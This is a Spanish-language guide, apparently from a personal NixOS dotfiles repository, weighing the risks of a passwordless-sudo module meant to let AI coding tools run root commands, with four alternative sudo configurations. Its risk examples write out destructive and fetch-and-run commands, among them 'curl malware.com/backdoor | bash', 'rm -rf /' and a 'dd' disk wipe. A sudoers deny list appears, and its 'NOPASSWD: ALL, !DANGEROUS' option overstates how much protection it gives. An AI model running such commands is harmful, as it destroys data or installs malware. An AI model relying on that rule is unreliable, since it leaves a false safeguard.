# 🔐 Configuración de Seguridad: Sudo Sin Contraseña

## ⚠️ IMPORTANTE: Lee Esto Primero

**Tu configuración actual permite `sudo` SIN contraseña a nivel de TODO EL SISTEMA.**

Esto NO está limitado a Cursor o VSCode. Es una configuración **global** de NixOS.

---

## 🔍 Estado Actual

### Ubicación de la Configuración
```
modules/system/ai-tools-unrestricted.nix
Línea 73: wheelNeedsPassword = false;
```

### ¿Qué Significa?
```bash
# En CUALQUIER terminal de tu sistema:
sudo systemctl restart nginx
# ✅ Se ejecuta inmediatamente, sin pedir contraseña

# En scripts automáticos:
#!/bin/bash
sudo rm -rf /tmp/old-files
# ✅ Se ejecuta automáticamente

# En Cursor, VSCode, terminal externa, TTY:
sudo cualquier-comando
# ✅ Nunca pide contraseña
```

---

## 🛡️ Análisis de Riesgos

### ✅ Ventajas (Por qué lo configuramos así)

1. **Workflow ágil de desarrollo**
   - `sudo nixos-rebuild switch` sin interrupciones
   - No interrumpe tu flujo de trabajo
   
2. **AI tools funcionan mejor**
   - Cursor puede ejecutar comandos sin bloqueos
   - Scripts automáticos no fallan
   
3. **Comodidad diaria**
   - No escribir contraseña 20 veces al día
   - Menos fricción en desarrollo

---

### ⚠️ Riesgos (Por qué deberías considerarlo)

1. **Acceso físico a tu PC**
   ```bash
   # Si alguien se sienta en tu PC cuando te levantas:
   sudo userdel ravn  # Borra tu usuario
   sudo rm -rf /       # Destruye el sistema
   # Sin contraseña = Sin protección
   ```

2. **Scripts maliciosos**
   ```bash
   # Un script que descargas de internet:
   #!/bin/bash
   sudo curl malware.com/backdoor | bash
   # Se ejecuta sin pedir permiso
   ```

3. **Errores de tipeo**
   ```bash
   # Quisiste escribir:
   sudo rm -rf /tmp/old-files
   
   # Pero escribiste (espacio extra):
   sudo rm -rf / tmp/old-files
   # ☠️ Destruye todo el sistema root
   # Sin contraseña = Sin oportunidad de pensarlo dos veces
   ```

4. **WiFi públicas**
   - Si tu laptop es comprometida en una red pública
   - El atacante tiene acceso root inmediato

5. **Malware con persistencia**
   - Un malware podría instalarse permanentemente
   - Modificar el sistema a nivel root
   - Todo sin pedir contraseña

---

## 📊 ¿Es Seguro Para Ti?

### ✅ MANTÉN la configuración actual (sin contraseña) SI:

- [ ] Es tu PC de escritorio en casa
- [ ] Vives solo o con personas de confianza
- [ ] No llevas tu PC a lugares públicos
- [ ] No te conectas a WiFi públicas
- [ ] Bloqueas tu sesión cuando te levantas
- [ ] Eres cuidadoso con comandos sudo
- [ ] No descargas/ejecutas scripts desconocidos
- [ ] Sabes lo que hace cada comando antes de ejecutarlo

**Si marcaste TODAS las casillas:** Tu riesgo es bajo, puedes mantener la config actual.

---

### ⚠️ CAMBIA a contraseña obligatoria SI:

- [ ] Llevas tu laptop a lugares públicos
- [ ] Te conectas a WiFi públicas
- [ ] Otras personas tienen acceso físico a tu PC
- [ ] Trabajas con datos sensibles
- [ ] Tu PC es para trabajo/empresa
- [ ] A veces ejecutas scripts sin revisar bien
- [ ] Compartes tu PC ocasionalmente

**Si marcaste ALGUNA casilla:** Considera cambiar la configuración.

---

## 🔧 Opciones de Configuración

### Opción 1: SIN Contraseña (Actual)

**Para:** Desarrollo personal, PC en casa segura

```nix
# modules/system/ai-tools-unrestricted.nix
security.sudo = {
  enable = true;
  wheelNeedsPassword = false;  # ← Sin contraseña
};
```

**Pros:**
- ✅ Máxima comodidad
- ✅ Workflow fluido
- ✅ AI tools funcionan sin problemas

**Contras:**
- ❌ Sin protección si alguien accede a tu sesión
- ❌ Scripts maliciosos tienen vía libre
- ❌ Errores de tipeo pueden ser catastróficos

---

### Opción 2: CON Contraseña + Timeout Largo (RECOMENDADO)

**Para:** Balance entre seguridad y comodidad

```nix
# modules/system/ai-tools-unrestricted.nix
security.sudo = {
  enable = true;
  wheelNeedsPassword = true;  # ← Requiere contraseña
  extraConfig = ''
    # Mantener variables de entorno
    Defaults env_keep += "SSH_AUTH_SOCK"
    Defaults env_keep += "NIX_PATH"
    Defaults env_keep += "HOME"
    
    # Recordar contraseña por 60 minutos
    Defaults timestamp_timeout=60
    
    # Una contraseña vale para todas las terminales
    Defaults !tty_tickets
    
    # No mostrar mensaje de advertencia
    Defaults !lecture
  '';
};
```

**Pros:**
- ✅ Pides contraseña 1-2 veces al día máximo
- ✅ Protección contra acceso no autorizado
- ✅ Tiempo para pensar antes de comandos destructivos
- ✅ Relativamente cómodo

**Contras:**
- ⚠️ Tienes que escribir contraseña ocasionalmente
- ⚠️ Cursor puede pedir interacción manual

**Cómo funciona:**
```bash
# Primera vez en el día
sudo nixos-rebuild switch
[sudo] password for ravn: ****  # ← Pides contraseña

# Durante los próximos 60 minutos
sudo systemctl status nginx  # ← Sin contraseña
sudo journalctl -xe          # ← Sin contraseña
sudo make switch             # ← Sin contraseña

# Después de 60 minutos
sudo nixos-rebuild switch
[sudo] password for ravn: ****  # ← Pides contraseña otra vez
```

---

### Opción 3: Sin Contraseña SOLO para Comandos Específicos

**Para:** Máxima seguridad con comodidad selectiva

```nix
# modules/system/ai-tools-unrestricted.nix
security.sudo = {
  enable = true;
  wheelNeedsPassword = true;  # Por defecto requiere contraseña
  
  extraRules = [
    {
      users = [ "ravn" ];
      commands = [
        # nixos-rebuild sin contraseña
        {
          command = "${pkgs.nixos-rebuild}/bin/nixos-rebuild";
          options = [ "NOPASSWD" ];
        }
        # systemctl sin contraseña
        {
          command = "${pkgs.systemd}/bin/systemctl";
          options = [ "NOPASSWD" ];
        }
        # journalctl sin contraseña
        {
          command = "${pkgs.systemd}/bin/journalctl";
          options = [ "NOPASSWD" ];
        }
      ];
    }
  ];
  
  extraConfig = ''
    Defaults env_keep += "SSH_AUTH_SOCK"
    Defaults env_keep += "NIX_PATH"
    Defaults env_keep += "HOME"
  '';
};
```

**Pros:**
- ✅ Comandos comunes sin contraseña
- ✅ Protección contra comandos destructivos
- ✅ Balance perfecto

**Contras:**
- ⚠️ Configuración más compleja
- ⚠️ Otros comandos sudo piden contraseña

**Cómo funciona:**
```bash
# Comandos permitidos (sin contraseña)
sudo nixos-rebuild switch        # ✅ Sin contraseña
sudo systemctl restart nginx     # ✅ Sin contraseña
sudo journalctl -xe              # ✅ Sin contraseña

# Comandos no en la lista (con contraseña)
sudo rm -rf /tmp/old-files       # ⚠️ PIDE contraseña
sudo userdel test-user           # ⚠️ PIDE contraseña
sudo dd if=/dev/zero of=/dev/sda # ⚠️ PIDE contraseña
```

---

### Opción 4: Contraseña Obligatoria para Comandos Peligrosos

**Para:** Prevención de desastres pero comodidad general

```nix
security.sudo = {
  enable = true;
  wheelNeedsPassword = false;  # Sin contraseña por defecto
  
  extraConfig = ''
    # Mantener variables de entorno
    Defaults env_keep += "SSH_AUTH_SOCK"
    Defaults env_keep += "NIX_PATH"
    Defaults env_keep += "HOME"
    
    # Definir comandos peligrosos
    Cmnd_Alias DANGEROUS = /run/current-system/sw/bin/rm -rf *, \
                           /run/current-system/sw/bin/dd, \
                           /run/current-system/sw/bin/mkfs*, \
                           /run/current-system/sw/bin/fdisk, \
                           /run/current-system/sw/bin/parted, \
                           /run/current-system/sw/bin/userdel
    
    # Estos comandos SIEMPRE piden contraseña
    ravn ALL=(ALL) PASSWD: DANGEROUS
    
    # Todo lo demás sin contraseña
    ravn ALL=(ALL) NOPASSWD: ALL, !DANGEROUS
  '';
};
```

**Pros:**
- ✅ Comodidad general
- ✅ Protección contra errores catastróficos
- ✅ "Red de seguridad" inteligente

**Contras:**
- ⚠️ No protege contra todo malware
- ⚠️ Solo comandos específicos protegidos

---

## 🔄 Cómo Cambiar la Configuración

### Paso 1: Editar el archivo
```bash
nano ~/dotfiles/modules/system/ai-tools-unrestricted.nix
```

### Paso 2: Cambiar la línea 73
```nix
# Busca esta línea:
wheelNeedsPassword = false;

# Cambia a una de estas opciones según lo que elijas arriba
```

### Paso 3: Aplicar cambios
```bash
sudo nixos-rebuild switch --flake ~/dotfiles#hydenix
```

### Paso 4: Verificar
```bash
# Abre una nueva terminal y prueba
sudo echo "test"

# Si configuraste con contraseña, debería pedirla
# Si dejaste sin contraseña, se ejecuta directo
```

---

## 📝 Mi Recomendación Personal

**Para tu situación (PC de desarrollo personal):**

### 🥇 Primera Opción: Opción 2 (Con contraseña + timeout 60 min)

**Por qué:**
- ✅ Escribes contraseña 1-2 veces al día (no molesta)
- ✅ Protección si dejas tu PC sin bloquear
- ✅ Tiempo para pensar antes de comandos destructivos
- ✅ Suficientemente cómodo para desarrollo

**Cuándo:**
- Si a veces otras personas están en tu casa
- Si ocasionalmente trabajas en cafeterías
- Si quieres "estar seguro" en general

---

### 🥈 Segunda Opción: Opción 1 (Sin contraseña - actual)

**Por qué:**
- ✅ Máxima comodidad
- ✅ Workflow más fluido
- ✅ Menos interrupciones

**Cuándo:**
- PC de escritorio que nunca sale de tu casa
- Vives solo
- Siempre bloqueas tu sesión
- Eres muy cuidadoso con comandos

---

## 🆘 En Caso de Emergencia

### Si crees que tu sistema fue comprometido:

```bash
# 1. Cambiar a contraseña obligatoria INMEDIATAMENTE
nano ~/dotfiles/modules/system/ai-tools-unrestricted.nix
# wheelNeedsPassword = true

# 2. Rebuild
sudo nixos-rebuild switch --flake ~/dotfiles#hydenix

# 3. Cambiar tu contraseña de usuario
passwd

# 4. Revisar usuarios del sistema
cat /etc/passwd

# 5. Revisar servicios activos
systemctl list-units

# 6. Revisar procesos sospechosos
ps aux | grep -v "\[" | less

# 7. Revisar logs
sudo journalctl -xe | less
```

---

## ✅ Checklist de Seguridad General

Independientemente de tu configuración de sudo:

- [ ] Usa contraseñas fuertes
- [ ] Bloquea tu sesión al levantarte (Super+L)
- [ ] No ejecutes scripts sin revisar el código
- [ ] Mantén tu sistema actualizado (`make update`)
- [ ] Usa firewall (NixOS lo tiene habilitado por defecto)
- [ ] No uses `curl url | bash` sin revisar el script
- [ ] Haz backups regulares de datos importantes
- [ ] Revisa periódicamente `systemctl list-units`
- [ ] Ten un segundo usuario sin sudo para navegación

---

## 📚 Referencias

- NixOS Security: https://nixos.org/manual/nixos/stable/#sec-security
- Sudo Manual: https://www.sudo.ws/docs/man/sudoers.man/
- Linux Security Best Practices: https://www.cisecurity.org/

---

**Última actualización:** 2026-01-10  
**Estado actual:** `wheelNeedsPassword = false` (Sin contraseña)  
**Archivo:** `modules/system/ai-tools-unrestricted.nix` línea 73

